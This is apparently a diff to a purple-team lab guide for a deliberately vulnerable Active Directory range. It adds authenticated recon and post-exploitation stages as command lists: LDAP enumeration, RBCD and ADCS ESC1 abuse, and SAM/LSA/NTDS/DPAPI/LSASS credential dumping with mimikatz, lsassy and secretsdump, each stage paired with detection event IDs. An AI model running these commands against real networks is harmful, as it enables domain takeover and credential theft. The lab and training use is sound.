@@ -1069,6 +1069,247 @@ nxc smb 192.168.77.10 -u users.txt -p Summer2026! --no-bruteforce
 
 ---
 
+## ⚠️ FLOW CORRECTION (2026-06-24 session 10)
+
+**The previous Step 0.5 Mechanics contained authenticated commands that don't belong at this stage.** At Phase 0 (no credentials), we cannot run `nxc smb ... -u intern_blue -p '1nt3rn_Blu3!'` because we don't have those credentials yet. The previous Mechanics section is being repurposed — only unauthenticated commands remain.
+
+**What we can actually do at Phase 0 (no creds) on Server 2025:**
+
+| Command | What it does | Server 2025 status |
+|---|---|---|
+| `nxc smb <hosts> --gen-relay-list <file>` | Outputs hosts that allow NTLM relay | ✅ Works (no auth) |
+| `nxc smb <hosts>` | Reports signing state per host | ✅ Works (no auth) |
+| `nxc smb <host> -u 'guest' -p '' --shares` | Guest session attempt | ❌ Usually blocked on Server 2025 |
+| `nxc smb <host> -u 'guest' -p '' --rid-brute 10000` | RID cycling with guest | ❌ Usually blocked |
+| `nxc ldap <host> -u '' -p ''` | Anonymous LDAP bind | ❌ Blocked |
+| `nxc smb <host> -u '' -p ''` | Null session | ❌ Blocked |
+
+**Auth-recon commands moved to post-credential-gain stages:**
+- **`intern_blue`** creds → Phase 1 Step 3 (new) — see Mechanics below
+- **`svc_mssql`** creds → Phase 2 Step 3 (new) — see Mechanics below
+- **admin/SYSTEM** on mbr01 → Phase 3.5 Step A (new) — see Mechanics below
+
+---
+
+## Mechanics: Phase 1 Step 3 — NetExec Authenticated Recon (First Credential) [STUB — UNTESTED]
+
+**Status:** 🆕 NEW (2026-06-24 session 10). Run after Phase 1 Step 2 (AS-REP Roast yields `intern_blue` creds).
+
+**Why this is a separate step:** Real-world attackers do recon at every credential gain. After getting `intern_blue`, we have:
+- Low-privilege user creds
+- Different protocol access than anonymous (can read shares, LAPS, etc.)
+- New tools unlocked (LSASS-protected operations, ADCS enumeration, etc.)
+
+#### Primary: NetExec
+```bash
+# Auth check + signing state
+nxc smb 192.168.77.0/24 -u intern_blue -p '1nt3rn_BLu3!'
+
+# Full user/computer/group enumeration
+nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_BLu3!' -q '(objectClass=user)' -attributes sAMAccountName
+nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_BLu3!' -q '(objectClass=computer)' -attributes sAMAccountName,operatingSystem
+nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_BLu3!' -q '(objectClass=group)' -attributes sAMAccountName
+
+# Shares + LAPS
+nxc smb 192.168.77.0/24 -u intern_blue -p '1nt3rn_BLu3!' --shares -M laps
+
+# Vulnerability scan (5 modules in one)
+nxc smb 192.168.77.10,11,12 -u intern_blue -p '1nt3rn_BLu3!' -M nopac -M zerologon -M petitpotam
+
+# New recon modules (2026-06-24 additions)
+nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_BLu3!' -M pre2k --kdcHost 192.168.77.10
+nxc smb 192.168.77.0/24 -u intern_blue -p '1nt3rn_BLu3!' -M enum_av
+nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_BLu3!' -M get-desc-users
+nxc ldap 192.168.77.11 -u intern_blue -p '1nt3rn_BLu3!' --find-delegation
+nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_BLu3!' --admin-count
+```
+
+#### Alternative: bloodyAD (Linux-friendly PowerView replacement)
+```bash
+bloodyAD --host 192.168.77.10 -d child.cadre.local -u intern_blue -p '1nt3rn_BLu3!' get object users --attr sAMAccountName
+bloodyAD --host 192.168.77.10 -d child.cadre.local -u intern_blue -p '1nt3rn_BLu3!' get object "CN=intern_blue,CN=Users,DC=child,DC=cadre,DC=local" --resolve-members
+```
+
+#### Alternative: ADeleg GUI (visual verification)
+```powershell
+# On mbr01 as intern_blue
+# Verify ACE#18 (intern_blue → analyst_t2: ForceChangePassword) is visible
+# View ADCS templates for ESC1-17 misconfigs
+```
+
+#### Alternative: impacket (for deeper queries)
+```bash
+impacket-lookupsid child.cadre.local/intern_blue:'1nt3rn_BLu3!'@192.168.77.11
+impacket-samrdump child.cadre.local/intern_blue:'1nt3rn_BLu3!'@192.168.77.11
+```
+
+#### CADRE-specific notes
+- `intern_blue` in `CN=Users,DC=child,DC=cadre,DC=local`
+- LAPS on mbr01: returns local Administrator password
+- Vuln scan: mbr01/mbr02 have `signing NOT required` (potential relay targets)
+- `--kdcHost` flag CRITICAL: 192.168.77.11 = child.cadre.local
+
+#### Detection
+- WinSec 4662 (DS Object Access) — high volume of ACL reads
+- Zeek LDAP bulk queries from single source IP
+- Sysmon EID 1 (ProcessCreate) for bloodyAD
+
+#### Cross-references
+- Campaign_suggestions.md #90 (NetExec), #91 (bloodyAD), #99 (ADeleg), #103 (UAC flags), #104 (machine account quota)
+- Phase 4 (BloodHound) — use this recon data to seed BH queries
+
+---
+
+## Mechanics: Phase 2 Step 3 — NetExec Authenticated Recon (Service Account) [STUB — UNTESTED]
+
+**Status:** 🆕 NEW (2026-06-24 session 10). Run after Phase 2 (Kerberoast yields `svc_mssql` creds).
+
+**Why this is a separate step:** Service account creds are different privilege tier than user. Often have:
+- MSSQL local admin (svc_mssql on mbr01)
+- ADCS enumeration rights
+- Delegation paths
+
+#### Primary: NetExec (now MSSQL unlocked)
+```bash
+# Verify across protocols
+nxc smb 192.168.77.22 -u svc_mssql -p 's3rv1c3_MSSQL!'
+nxc mssql 192.168.77.22 -u svc_mssql -p 's3rv1c3_MSSQL!' --local-auth
+nxc winrm 192.168.77.22 -u svc_mssql -p 's3rv1c3_MSSQL!'
+nxc ldap 192.168.77.10 -u svc_mssql -p 's3rv1c3_MSSQL!' -q '(objectClass=user)' -attributes sAMAccountName
+
+# ADCS template enumeration (critical for Branch B)
+nxc ldap 192.168.77.10 -u svc_mssql -p 's3rv1c3_MSSQL!' -M adcs
+
+# Delegation paths
+nxc ldap 192.168.77.10 -u svc_mssql -p 's3rv1c3_MSSQL!' --find-delegation
+
+# AS-REP + Kerberoast (full enum with service account rights)
+nxc ldap 192.168.77.10 -u svc_mssql -p 's3rv1c3_MSSQL!' --asreproast /tmp/asrep_svc.txt --kdcHost 192.168.77.10
+nxc ldap 192.168.77.10 -u svc_mssql -p 's3rv1c3_MSSQL!' --kerberoasting /tmp/kerb_svc.txt --kdcHost 192.168.77.10
+```
+
+#### Alternative: bloodyAD (for ACL analysis)
+```bash
+bloodyAD --host 192.168.77.10 -d child.cadre.local -u svc_mssql -p 's3rv1c3_MSSQL!' get object "CN=svc_mssql,OU=Service Accounts,DC=child,DC=cadre,DC=local" --resolve-members
+bloodyAD --host 192.168.77.11 -d child.cadre.local -u svc_mssql -p 's3rv1c3_MSSQL!' add rbcd "CN=mbr01,OU=Computers,DC=child,DC=cadre,DC=local" "CN=fakePC,CN=Computers,DC=child,DC=cadre,DC=local"
+```
+
+#### Alternative: Certipy v5.1.0 (for ADCS — deeper than nxc)
+```bash
+certipy find -u svc_mssql@child.cadre.local -p 's3rv1c3_MSSQL!' -dc-ip 192.168.77.11 -vulnerable
+certipy req -u svc_mssql@child.cadre.local -p 's3rv1c3_MSSQL!' -ca cadre-CA -target dc01.cadre.local -template CADRE-ESC1 -upn administrator@cadre.local
+```
+
+#### Alternative: impacket-mssqlclient (for MSSQL-specific recon)
+```bash
+impacket-mssqlclient child.cadre.local/svc_mssql:'s3rv1c3_MSSQL!'@192.168.77.22
+SQL> SELECT SYSTEM_USER
+SQL> SELECT name FROM sys.server_principals WHERE is_disabled = 0
+SQL> SELECT * FROM sys.server_permissions WHERE grantee_principal_id = (SELECT principal_id FROM sys.server_principals WHERE name = 'svc_mssql')
+```
+
+#### CADRE-specific notes
+- `svc_mssql` is in `OU=Service Accounts,DC=child,DC=cadre,DC=local`
+- svc_mssql is **local admin on mbr01** (Windows host config) but **NOT sysadmin in MSSQL** (per `09-sql-wsus-verify.yml`)
+- ADCS deployed on dc01.cadre.local with 12+ ESC templates
+- `--kdcHost` flag: 192.168.77.11 = child.cadre.local
+
+#### Detection
+- WinSec 4624 (Logon) Type 3 from svc_mssql
+- WinSec 4662 (DS Object Access) for ADCS template enumeration
+- Zeek LDAP bulk queries
+
+#### Cross-references
+- Campaign_suggestions.md #90 (NetExec), #91 (bloodyAD), #92 (Certipy), #104 (machine account quota)
+- Phase 3 (SQL exec) + Phase 5 (Coercion via WT017)
+
+---
+
+## Mechanics: Phase 3.5 Step A — NetExec Authenticated Recon (Admin/SYSTEM) [STUB — UNTESTED]
+
+**Status:** 🆕 NEW (2026-06-24 session 10). Run after Phase 3 (SYSTEM on mbr01).
+
+**Why this is a separate step:** At admin/SYSTEM on mbr01, we have:
+- Local SAM/LSA/DPAPI access
+- ADCS enumeration rights
+- Network pivot potential (dump creds for other hosts)
+
+#### Primary: NetExec (16+ dump modules now unlocked)
+```bash
+# SAM database dump (local account hashes)
+nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --sam
+
+# LSA secrets dump (service account plaintext)
+nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --lsa
+
+# NTDS.dit dump (full domain hashes)
+nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --ntds
+
+# DPAPI secrets dump
+nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --dpapi
+
+# WinSCP saved sessions
+nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' -M winscp
+
+# LAPS password
+nxc ldap 192.168.77.11 -u Administrator -p 'Pwn3d_T2!' --laps
+```
+
+#### Alternative: lsassy v3.1.16 (15+ LSASS dump methods)
+```bash
+lsassy -d child.cadre.local -u Administrator -p 'Pwn3d_T2!' 192.168.77.22
+lsassy -m nanodump -d child.cadre.local -u Administrator -p 'Pwn3d_T2!' 192.168.77.22
+```
+
+#### Alternative: DonPAPI v2.0+ (DPAPI focus)
+```bash
+donpapi collect -u child.cadre.local/Administrator -p 'Pwn3d_T2!' -d child.cadre.local -t 192.168.77.22
+donpapi collect -u Administrator -p 'Pwn3d_T2!' -d child.cadre.local -t 192.168.77.22 --collectors Chromium,CredMan,WiFi
+```
+
+#### Alternative: Manual mimikatz (full control, more steps)
+```cmd
+# On mbr01 as SYSTEM (via xp_cmdshell + GodPotato)
+mimikatz.exe
+privilege::debug
+token::elevate
+lsadump::sam
+lsadump::secrets
+sekurlsa::logonpasswords
+dpapi::cred /in:C:\Users\analyst_cloud\AppData\Roaming\Microsoft\Credentials\<blob>
+```
+
+#### Alternative: secretsdump.py (impacket — for NTDS dump)
+```bash
+impacket-secretsdump child.cadre.local/Administrator:'Pwn3d_T2!'@192.168.77.22 -just-dc-user krbtgt
+impacket-secretsdump child.cadre.local/Administrator:'Pwn3d_T2!'@192.168.77.22 -just-dc
+```
+
+#### Alternative: SharpHound (BloodHound collection as SYSTEM)
+```cmd
+SharpHound.exe -c All --zipfilename C:\Windows\Temp\sh.zip
+```
+
+#### CADRE-specific notes
+- mbr01 has auto-logon for `analyst_cloud` → expect plaintext password in LSA
+- LSASS PPL OFF per `04-vulnerabilities.yml` → all dump methods work
+- Defender disabled per `04-vulnerabilities.yml` → no AV interference
+- Domain Backup Key accessible from SYSTEM
+
+#### Detection
+- Sysmon EID 10 (ProcessAccess) — LSASS access
+- Sysmon EID 1 (ProcessCreate) — dump method binary
+- WinSec 4663 — file system access on dump file
+- WinSec 4624 Type 2 (Interactive) — post-dump SYSTEM logon
+
+#### Cross-references
+- Campaign_suggestions.md #90 (NetExec), #93 (DonPAPI), #94 (lsassy), #95 (KrbRelayUp)
+- See Phase 3.5 (Credential Theft from SYSTEM) below for manual mimikatz + SharpHound
+
+---
+
+## Mechanics: Phase 0 Step 0.5b — NetExec `--kdcHost` flag + 6 new modules [STUB — UNTESTED]
+
 ## Mechanics: Phase 0 Step 0.5b — NetExec `--kdcHost` flag + 6 new modules [STUB — UNTESTED]
 
 **Status:** Ready to test. Per `Campaign_suggestions.md #98` (Hacking Articles AI+HexStrike analysis 2026-06-21).
